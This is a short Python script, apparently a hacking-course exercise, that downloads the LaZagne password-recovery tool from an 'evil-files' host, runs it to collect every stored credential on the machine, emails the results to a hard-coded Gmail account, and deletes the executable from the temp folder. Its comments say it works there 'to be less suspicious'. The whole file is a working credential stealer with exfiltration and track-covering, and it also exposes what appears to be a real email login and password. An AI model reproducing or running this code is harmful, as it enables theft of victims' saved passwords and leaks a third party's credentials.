#!/usr/bin/env python
# to download lazagne execute and report(sms)
import requests,os,tempfile
import subprocess,smtplib#sntblib allow to send email from py code
def download(url):
    get_response=requests.get(url)
    print(get_response.content)#displays all the jebbrish binary we use to see in raw header. now write this content to a file so it is downloaded
    file_name=url.split("/")[-1]
    with open(file_name,"wb") as out_file:
        out_file.write(get_response.content)
def send_mail(email,password,message):#
    server=smtplib.SMTP("smtp.gmail.com",587)#smtp.gmail.com is server that i want to use which is google server 587=port of that server 
    server.starttls()#initiate tls
    server.login(email,password)
    server.sendmail(email,email,message)#here from and to same mail address
    server.quit()    
temp_directory=tempfile.gettempdir()#to be less suspicious go to temp dir download exe and remove lazagne from there
os.chdir(temp_directory)    
download("https://10.0.2.16/evil-files/laZagne.exe")    
result=subprocess.check_output("laZagne.exe all",shell=True)#fun check_output allow to execute command and return result unlike popen
send_mail("dipendrathapa044@gmail.com","imrockstar123",result)
os.remove("laZagne.exe")

# execute this to download lezagne